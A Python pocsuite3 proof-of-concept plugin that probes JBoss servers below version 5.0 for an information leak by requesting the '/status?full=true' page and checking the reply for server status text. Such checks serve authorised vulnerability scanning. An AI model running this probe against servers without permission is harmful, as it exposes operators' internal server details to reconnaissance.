#!/usr/bin/env python
# coding: utf-8

from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = '''Jboss敏感信息泄露'''
	desc = ''''''
	solution = ''''''
	severity = '''low'''
	vulType = '''info-disclosure'''
	taskType = '''app-vul'''
	references = ['''''']
	appName = '''Jboss'''
	appVersion = '''<5.0'''
	appPowerLink = '''jboss.org'''
	samples = ['''''']
	install_requires = ['''''']

	def _verify(self):
		self.url, ip, port = parse_ip_port(self.target, 8080)
		result = {}
		payload = '/status?full=true'
		payload_url = make_verify_url(self.url, payload, mod=0)
		response = requests.get(payload_url, verify=False, timeout=15)
		if b'Max processing time' in response.content and response.status_code == 200:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = response.url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	_attack = _verify

	def parse_output(self, result):
		#parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output


register_poc(TestPOC)
